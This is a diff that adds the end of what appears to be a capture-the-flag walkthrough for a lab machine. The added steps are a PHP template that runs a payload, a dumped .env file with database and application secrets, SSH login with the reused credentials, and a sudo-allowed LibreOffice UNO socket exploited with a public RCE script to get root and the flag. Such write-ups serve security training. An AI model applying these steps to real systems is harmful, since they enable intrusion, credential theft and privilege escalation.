@@ -295,6 +295,66 @@ in Alerts Tab we can create a new template with:
 system("/tmp/r45");
 @endphp
 
+before we need to give +x to the file
+
+launch msfconsole and we get the shell as librenms
+
+inside the /opt/librenms .custom.env:
+APP_KEY=base64:jRoDTOFGZEO08+68w7EzYPp8a7KZCNk+4Fhh97lnCEk=
+
+DB_HOST=localhost
+DB_DATABASE=librenms
+DB_USERNAME=kai_relay
+DB_PASSWORD=mychemicalformulaX
+
+#APP_URL=
+NODE_ID=648b260eb18d2
+VAPID_PUBLIC_KEY=BDhe6thQfwA7elEUvyMPh9CEtrWZM1ySaMMIaB10DsIhGeQ8Iks8kL6uLtjMsHe61-ZCC6f6XgPVt7O6liSqpvg
+VAPID_PRIVATE_KEY=chr9zlPVQT8NsYgDGeVFda-AiD0UWIY6OW-jStiwmTQ
+
+connecting via ssh with this credentials and we get a shell as kai_relay
+
+sudo -l:
+Matching Defaults entries for kai_relay on forumlax:
+    env_reset, timestamp_timeout=0, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_reset,
+    timestamp_timeout=0
+
+User kai_relay may run the following commands on forumlax:
+    (ALL) NOPASSWD: /usr/bin/office.sh
+
+
+cat /usr/bin/office.sh
+#!/bin/bash
+/usr/bin/soffice --calc --accept="socket,host=localhost,port=2002;urp;" --norestore --nologo --nodefault --headless
+
+its runs a StarOffice script that has a RCE:
+https://github.com/sud0woodo/ApacheUNO-RCE/blob/master/uno-rce.py
+
+so we need to download a rce
+
+exit the meterpreter shell as frank_dorky
+
+portforward this script using ssh ssh -L 2002:127.0.0.1:2002 frank_dorky@10.10.11.6
+
+edit the rce to our r45:
+shell_execute.execute("calc.exe", '',1) > shell_execute.execute("/tmp/r45", '',1)
+
+download a library for this script:
+sudo apt-get install python3-uno
+
+launch the meterpreter to our r45 payload
+
+launch the script as kai_relay
+
+and launch the rce:
+python3 uno-rce.py --host 127.0.0.1 --port 2002
+
+and we get the shell as root
+
+go to root directory and get the flag:
+87ec133e20297e61392be47a559f2abd
+
 
 
 
